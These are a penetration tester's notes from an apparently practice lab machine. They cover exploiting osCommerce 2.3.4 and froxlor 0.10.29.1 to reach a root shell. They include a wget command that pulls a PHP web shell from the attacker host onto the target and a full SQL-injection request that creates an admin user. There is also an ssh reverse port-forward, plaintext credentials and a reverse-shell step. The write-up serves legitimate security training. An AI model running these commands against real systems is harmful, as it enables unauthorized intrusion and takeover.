### ++ Approach ++
#### Credentials
	* flybike:Christopher (user in froxlor)

#### Services
	##### 60001 HTTP
		In /docs we find release_notes.pdf file where we found webapp oscommerce version 2.3.4

### ++ Vulnerabilities ++

#### Vuln 1: RCE in oscommerce 2.3.4 ++
	* https://www.exploit-db.com/exploits/50128
	* We abuse RCE and place a php shell by using a python server:
		Cmd: "wget http://192.168.45.245/p0wny.php -O ../../p0wny.php"
		Shell: http://milan:60001/catalog/p0wny.php

#### Vuln 2: RCE in froxlor 0.10.29.1 ++
	* https://www.exploit-db.com/exploits/50502
	* With the following request we create an admin user:
		POST /customer_mysql.php?s=84e97a8c8fa9eafb092871223091f2bb HTTP/1.1
		[...SNIP...]

		s=84e97a8c8fa9eafb092871223091f2bb&page=mysqls&action=add&send=send&custom_suffix=`%3binsert+into+panel_admins+(loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings)+values+('testing','$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2',1,1,1,1)%3b--&description=testing&mysql_password=Christopher&mysql_password_suggestion=sarah&sendinfomail=0&sendinfomail=1

### ++ System Interaction ++
#### Foothold  
	* Abusing vuln 1 we got a shell as www-data

#### Privilege Escalation 
	* In /var/www/html/oscommerce/catalog/admin/includes/configure.php we found credentials for mysql db. With oscuser we just found a non-crackable admin hash but connecting with the same password as root, we found froxlor db with hashes in panel_customers table.
		Sarah: flybike:Christopher
	* We discover an open port in 60002 but we cannot access from outside, so we use port redirect from the server with "ssh -R *:60002:localhost:60002 kali@192.168.45.245" (before we have to enable ssh in kali "sudo systemctl start ssh")
	* In localhost:60002 we find froxlor and we can access with flybike:Christopher
	* In directory /var/www/html/froxlor/install/updates/froxlor we can find that we have 0.10 version and we found it vulnerable to this exploit (https://www.exploit-db.com/exploits/50502)
	* Abuse vuln 2 and get a admin user, move pentestmonkey php rev shell and execute it to get a shell as root (cron job runs every 5 minute, so don't get too impatient)
	
#### Post-exploitation 
	* 
